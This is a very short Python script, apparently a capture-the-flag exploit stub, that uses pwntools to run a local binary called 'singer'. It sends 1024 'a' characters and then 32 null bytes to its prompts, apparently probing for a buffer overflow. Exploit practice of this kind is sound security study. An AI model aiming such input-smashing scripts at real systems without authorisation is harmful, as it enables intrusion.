from pwn import *
context.log_level='debug'

p=process("./singer")
p.recvuntil(":")
p.send('a'*1024)
p.recvuntil(":")
p.send('\x00'+'\x00'*31)
print(p.recvall())
